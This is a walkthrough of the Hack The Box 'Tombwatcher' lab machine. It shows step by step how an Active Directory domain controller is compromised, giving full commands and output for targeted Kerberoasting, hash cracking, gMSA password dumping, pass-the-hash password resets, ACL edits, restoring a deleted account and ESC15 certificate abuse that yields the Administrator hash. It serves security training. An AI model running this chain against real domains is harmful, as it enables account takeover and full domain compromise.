---
title: "Hack The Box: Tombwatcher"
date: 2025-11-04
summary: "A Medium Windows-based machine where the target is compromised through an Active Directory ACL abuse chain: targeted Kerberoasting yields initial group membership, enabling gMSA password dumping and account force-resets for WinRM access. Privileges are escalated by restoring a deleted certificate administrator account from the Active Directory Recycle Bin and exploiting an AD CS ESC15 vulnerability to request an administrative certificate."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/TombWatcher"
tags:
  - ace-addself
  - ace-forcechangepassword
  - ace-genericall
  - ace-readgmsapassword
  - ace-writeowner
  - ace-writespn
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - bloodyad
  - certipy-ad
  - esc15
  - evil-winrm
  - gmsadumper-py
  - impacket-dacledit
  - impacket-owneredit
  - john
  - netexec
  - nmap
  - pth-net
  - rusthound-ce
  - sharphound
  - targetedkerberoasting-py
---

### Provided Information

"As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry`:`H3nry_987TGV!`"

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.232.167
Nmap scan report for 10.129.232.167
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-03 16:31:26 +04 for 147s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http              syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-03 16:31:23Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-03T16:33:32+00:00; +3h59m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
<SNIP>
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
<SNIP>
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
<SNIP>
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
<SNIP>
5985/tcp open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20684/tcp): CLEAN (Timeout)
|   Check 2 (port 38636/tcp): CLEAN (Timeout)
|   Check 3 (port 32023/udp): CLEAN (Timeout)
|   Check 4 (port 38975/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 3h59m39s, deviation: 0s, median: 3h59m39s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-03T16:32:53
|_  start_date: N/A
```

The pattern of running ports and services indicates that the target is a Domain Controller (DC).

Checking the contents of the web server on port 80 reveals the default IIS page, nothing too interesting.

I didn’t start fuzzing for hidden pages because this is an Active Directory scenario, so there are more important services to enumerate, mainly SMB.

I ran `netexec` to enumerate SMB shares but none of them were interesting as all were default domain shares:

```bash
$ netexec smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
```

The only interesting finding is the domain `tombwatcher.htb`, so let’s add it to `/etc/hosts` in addition to the DC FQDN identified in the `nmap` output above:

```bash
echo "10.129.232.167 tombwatcher.htb dc01.tombwatcher.htb" | sudo tee -a /etc/hosts
```

### Bloodhound

Since no interesting shares were identified in the domain, I went to `bloodhound` to enumerate relationships and identify possible attack vectors.

I started by running both `bloodhound-ce-python` and `rusthound-ce` to get maximum information possible:

```bash
$ bloodhound-ce-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -ns 10.129.232.167 -c all --zip

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: tombwatcher.htb
<SNIP>
INFO: Compressing output into 20251104185334_bloodhound.zip
```

```bash
$ rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -n 10.129.232.167 -c All --zip
---------------------------------------------------
Initializing RustHound-CE at 18:55:51 on 11/04/25
Powered by @g0h4n_0
---------------------------------------------------
<SNIP>
RustHound-CE Enumeration Completed at 18:55:57 on 11/04/25! Happy Graphing!
```

Now let’s run `sudo bloodhound`, import the collected data, and check what our user Henry can do in the domain.

### Attack Chain

![Figure 1](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

We can see that Henry has WriteSPN permission over Alfred.

Let’s see what can Alfred do:

![Figure 2](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

So Alfred can add himself to the Infrastructure group.

Let’s see who is in that group and what can the group members do:

![Figure 3](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

So members of the Infrastructure group (none currently) can read the GMSA password of the Ansible_dev$ account, which seems to be a Group Managed Service Account (GMSA) (according to Bloodhound).

Now let’s see what can Ansible_dev$ do:

![Figure 4](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

So it has ForceChangePassword permission over the user Sam.

Let’s see what can Sam do:

![Figure 5](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Sam has WriteOwner permission over John.

Finally, let’s see what can John do:

![Figure 6](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-7.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

So John has GenericAll permission over the ADCS OU, but that isn’t everything:

![Figure 7](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-8.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

John is part of the Remote Management Users group, which means that we can use `evil-winrm` to gain a Powershell shell on the DC once we compromise John.

So the full attack chain will be as follows:

![Figure 8](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-9.png)

<figcaption class="blog-image-caption">Figure 8</figcaption>

### Abusing ACE Permissions

1. Let’s start by abusing the WriteSPN permission that Henry has over Alfred by performing a targeted kerberoasting attack using `targetedKerberoast.py`:

```bash
$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --request-user Alfred
[*] Starting kerberoast attacks
[*] Attacking user (Alfred)
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$75d2d391c<REDACTED>
[VERBOSE] SPN removed successfully for (Alfred)
```

> **Note:** If you got an error related to time and skew, check out [this article](https://medium.com/@cider-htb/when-your-vm-lies-about-the-time-fixing-clock-skew-errors-within-ctfs-and-active-directory-5698b9493a37).

Let’s attempt to crack the user’s hash using `john`:

```bash
$ echo '$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$75d2d391c<REDACTED>' > alfred.hash

$ john alfred.hash -w=/usr/share/wordlists/rockyou.txt                 
<SNIP>
bas<REDACTED>       (?)     
<SNIP>
```

So the hash is successfully cracked.

Let’s test the user’s credentials:

```bash
$ netexec smb tombwatcher.htb -u alfred -p 'bas<REDACTED>'
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\alfred:bas<REDACTED>
```

They work.

1. Next, let’s abuse the AddSelf permission to add Alfred to the Infrastructure group, through the usage of `bloodyAD`:

```bash
$ bloodyAD -u 'Alfred' -p 'bas<REDACTED>' -d tombwatcher.htb --host 10.129.232.167 add groupMember 'Infrastructure' Alfred   
[+] Alfred added to Infrastructure
```

1. Now as part of the Infrastructure group, let’s read the GMSA password of the Ansible_dev$ account through using `gMSADumper.py`:

```bash
$ python3 gMSADumper.py -u 'Alfred' -p 'bas<REDACTED>' -d 'tombwatcher.htb'                                               
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::bf8b11<REDACTED>
ansible_dev$:aes256-cts-hmac-sha1-96:f36c76683b132f15610b96c7570f8749f7bf7d41bb87339536737fa02ba483b9
ansible_dev$:aes128-cts-hmac-sha1-96:8e2884da3f366cd9faa83445a1ebbf36
```

So we got the NTLM hash of the Ansible_dev$ user.

Let’s attempt to crack it using `john`:

```bash
$ echo 'bf8b11<REDACTED>' > ansible_dev.hash

$ john ansible_dev.hash -w=/usr/share/wordlists/rockyou.txt --format=nt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-11-05 00:41) 0g/s 20490Kp/s 20490Kc/s 20490KC/s  _ 09..*7¡Vamos!
Session completed.
```

So the hash wasn’t successfully cracked, yet we can still use it in Pass-the-Hash attacks.

1. Let’s now abuse the ForceChangePassword permission by the Ansible_dev$ account to change the password of Sam, using `pth-net`:

```bash
$ pth-net rpc password "Sam" "sam123456" -U tombwatcher.htb/'ansible_dev$'%'ffffffffffffffffffffffffffffffff':'bf8b11<REDACTED>' -S 10.129.232.167
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

Now let’s verify that the password was changed:

```bash
$ netexec smb tombwatcher.htb -u sam -p sam123456
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\sam:sam123456
```

Success!

1. Now with Sam under our control, let’s abuse the WriteOwner permission to change the owner of the user John to be us (Sam), and give ourself GenericAll permission over John to change its password.

First, let’s change the owner using `impacket-owneredit`:

```bash
$ impacket-owneredit -action write -new-owner 'Sam' -target 'John' tombwatcher.htb/Sam:sam123456
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

Now let’s add GenericAll permission to Sam over John using `impacket-dacledit`:

```bash
$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'Sam' -target 'John' tombwatcher.htb/Sam:sam123456
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251105-005325.bak
[*] DACL modified successfully!
```

Finally, let’s change John’s password using `pth-net`:

```bash
$ pth-net rpc password "John" "john123456" -U tombwatcher.htb/Sam%'sam123456' -S 10.129.232.167
E_md4hash wrapper called.
```

And let’s verify that the change was successful:

```bash
$ netexec smb tombwatcher.htb -u john -p john123456                                                             
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:john123456 
```

Success!

1. Now after all of this, and with John being part of the Remote Management Users group, let’s use `evil-winrm` to gain a shell over the DC, where `user.txt` will be awaiting:

```bash
$ evil-winrm -u John -p john123456 -i dc01.tombwatcher.htb                        
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls

    Directory: C:\Users\john\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2025   1:42 PM             34 user.txt

*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
423d06<REDACTED>
```

### Revisiting Bloodhound

Now that we have a Powershell shell over the DC, let’s upload `Sharphound` to the target and run it to get extra data for `bloodhound` that might have been missed during external data collection:

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> upload SharpHound.exe
                                        
<SNIP>
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\john\Desktop> .\SharpHound.exe -c All --zipfilename sharphound_data
<SNIP>
2025-11-04T16:06:08.1472240-05:00|INFORMATION|SharpHound Enumeration Completed at 4:06 PM on 11/4/2025! Happy Graphing!
*Evil-WinRM* PS C:\Users\john\Desktop> ls

    Directory: C:\Users\john\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2025   4:06 PM          38373 20251104160601_sharphound_data.zip
-a----        11/4/2025   4:06 PM           1823 NzkzZThmZmEtZjFhYi00OTRmLTgzMzctMWY3N2FmZGE1ZmUy.bin
-a----        11/4/2025   4:05 PM        1315328 SharpHound.exe
-ar---        11/4/2025   1:42 PM             34 user.txt

*Evil-WinRM* PS C:\Users\john\Desktop> download 20251104160601_sharphound_data.zip
                                        
<SNIP>
                                        
Info: Download successful!
```

And let’s import the data to `bloodhound`.

Initial enumeration of new `bloodhound` data revealed nothing new to me, so I went back to the fact that John has GenericAll permission over ADCS OU. This suggests that there might be certificates in the domain and maybe some certificate vulnerabilities exist.

### Abusing Certificates

By reenumerating John, the following can be identified:

![Figure 9](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-10.png)

<figcaption class="blog-image-caption">Figure 9</figcaption>

The existence of multiple certificate templates encouraged me to enumerate the domain certificate templates using `certipy-ad`:

```bash
$ certipy-ad find -target dc01.tombwatcher.htb -u john -p john123456                            
Certipy v5.0.3 - by Oliver Lyak (ly4k)
<SNIP>
[*] Saving text output to '20251105012844_Certipy.txt'
[*] Wrote text output to '20251105012844_Certipy.txt'
[*] Saving JSON output to '20251105012844_Certipy.json'
[*] Wrote JSON output to '20251105012844_Certipy.json'
```

By investigating the output, the 17th template, WebServer, had an interesting finding:

```bash
17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```

Notice how there is one SID that isn’t resolved to a name. Why didn’t the SID get resolved?

Let’s identify any information related to this SID in `bloodhound`:

![Figure 10](/assets/images/writeups/hack-the-box-tombwatcher/hack-the-box-tombwatcher-fig-11.png)

<figcaption class="blog-image-caption">Figure 10</figcaption>

It indeed exists, but no much details are mentioned.

Also, notice how `bloodhound` wasn’t able to identify the object type.

Does this mean that the object is deleted but still in the AD recycle bin?

Let’s check that out by using the  `Get-ADObject` cmdlet in our `evil-winrm` shell:

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid, lastKnownParent

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1109

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1110

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

The object is indeed in the AD Recycle Bin, and it is a user called “cert_admin”.

How is that useful? Notice that the LastKnownParent of “cert_admin” is the ADCS OU, and recall that John has GenericAll permission over that OU. Thus, John can change the password of the “cert_admin” user and gain control over it.

Let’s first restore the user from the recycle bin by its identity:

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

And now let’s change the user’s password:

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'admin123456' -AsPlainText -Force)
```

Finally, let’s verify the password change:

```bash
$ netexec smb tombwatcher.htb -u cert_admin -p 'admin123456'
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\cert_admin:admin123456 
```

Success!

Now after compromising the “cert_admin” user, its name encourages looking for vulnerable templates, so let’s do that with the newly identified credentials using `certipy-ad`:

```bash
$ certipy-ad find -target dc01.tombwatcher.htb -u cert_admin -p 'admin123456' -vulnerable -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

`certipy-ad` identified that the ESC15 vulnerability exists, which, as [explained by the author of `certipy-ad`](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), is:

> ESC15, also known by the community name "EKUwu" (research by Justin Bollinger from TrustedSec) and tracked as CVE-2024-49019, describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. If the CA has not been updated with the relevant security patches (Nov 2024), it will incorrectly include these attacker-supplied Application Policies in the issued certificate. This occurs even if these policies are not defined in, or are inconsistent with, the template's intended Extended Key Usages (EKUs), thereby granting the certificate unintended capabilities.
> 

I followed the steps provided in the article above to gain an administrator certificate:

```bash
$ certipy-ad req -u cert_admin -p 'admin123456' -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Then I used the certificate to request a certificate on behalf of a target privileged user:

```bash
$ certipy-ad req -u 'cert_admin' -p 'admin123456' -dc-ip '10.129.232.167' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'administrator.pfx' -on-behalf-of 'tombwatcher\Administrator' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): n
[*] Wrote certificate and private key to 'administrator_056baa8e-0dcd-4d43-9b3c-40dc7230e4c6.pfx'
```

And finally, I authenticated as the privileged user using the "on-behalf-of" certificate:

```bash
$ certipy-ad auth -pfx administrator_056baa8e-0dcd-4d43-9b3c-40dc7230e4c6.pfx -dc-ip 10.129.232.167
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db4<REDACTED>
```

With the NTLM hash of the administrator in hand, it is a matter of `evil-winrm` to gain the `root.txt` flag:

```bash
$ evil-winrm -u Administrator -H f61db4<REDACTED> -i 10.129.232.167
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2025   1:42 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4ef09d<REDACTED>
```
